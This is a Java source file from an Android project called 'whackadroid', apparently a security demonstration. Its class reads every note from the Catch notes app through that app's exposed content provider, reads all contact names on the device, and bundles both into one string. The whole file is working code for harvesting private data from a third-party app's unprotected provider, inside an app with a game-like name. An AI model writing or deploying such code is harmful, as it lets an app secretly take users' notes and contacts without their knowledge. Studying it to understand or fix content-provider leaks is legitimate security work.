package com.tum.whackadroid.Helper;

import android.content.ContentProviderClient;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.RemoteException;
import android.provider.ContactsContract;
import android.util.Log;

import com.tum.whackadroid.Activity.MainActivity;

public class RetrieveCatchNotes {

    public static String getNotes(Context context) {
        return getDatabaseContent(getCursor(context));
    }

    private static Cursor getCursor(Context context) {
        Cursor cursor = null;
        final Uri uri = Uri.parse("content://com.threebanana.notes.provider.NotePad/notes");
        final ContentProviderClient contentProviderClient = context.getContentResolver().acquireContentProviderClient(uri);

        try {
            cursor = contentProviderClient.query(uri, null, null, null, null);
        } catch (RemoteException e) {
            Log.e(MainActivity.WHACK_A_DROID, "Error while querying Catch notes!", e);
            e.printStackTrace();
        }

        return cursor;
    }

    private static String getDatabaseContent(final Cursor cursor) {
        final StringBuilder notesString = new StringBuilder();

        cursor.moveToFirst();
        int count = 1;
        while (!cursor.isAfterLast()) {
            final String note = cursor.getString(cursor.getColumnIndex("text"));
            notesString.append("Note " + count + ":\n'").append(note).append("'\n");
            count++;
            cursor.moveToNext();
        }
        cursor.close();
        return notesString.toString();
    }

    public static String acquireInformation(final Context context) {
        final StringBuilder builder = new StringBuilder("Contacts:\n");
        // Read all contact names
        final ContentResolver contentResolver = context.getContentResolver();
        final String[] projection = new String[] { ContactsContract.Contacts.DISPLAY_NAME };
        final Cursor cursor = contentResolver.query(ContactsContract.Data.CONTENT_URI, projection, null, null, null);
        try {
            if ((cursor != null ? cursor.getCount() : 0) > 0) {
                cursor.moveToFirst();
                while (cursor != null && cursor.moveToNext()) {
                    final String name = cursor.getString(cursor.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME));
                    builder.append(name).append("\n");
                }
            } else {
                Log.d("WhackADroid", "Contacts are empty!");
            }
        } finally {
            cursor.close();
        }


        builder.append("\nNotes:\n");
        builder.append(RetrieveCatchNotes.getNotes(context));
        Log.d(MainActivity.WHACK_A_DROID, "Information length in bytes: " + builder.toString().getBytes().length);
        return builder.toString();
    }
}